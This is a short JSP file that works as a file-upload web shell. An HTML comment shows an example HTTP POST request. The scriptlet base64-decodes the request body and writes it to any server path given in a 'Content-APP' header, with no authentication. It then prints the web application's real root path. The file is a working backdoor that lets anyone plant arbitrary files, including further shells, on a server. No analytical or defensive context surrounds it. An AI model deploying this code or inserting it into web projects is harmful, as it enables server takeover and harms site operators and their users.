<!-- 

POST /writefile.jsp HTTP/1.1
Host: HOSTNAME
Connection: close
Content-APP: D:\path\file.jsp
Content-Length: 13

YmFzZTY0Cg==

-->

<%sun.misc.BASE64Decoder b = new sun.misc.BASE64Decoder();new java.io.FileOutputStream(request.getHeader("Content-APP")).write(b.decodeBuffer(request.getInputStream()));out.println(request.getSession().getServletContext().getRealPath(""));%>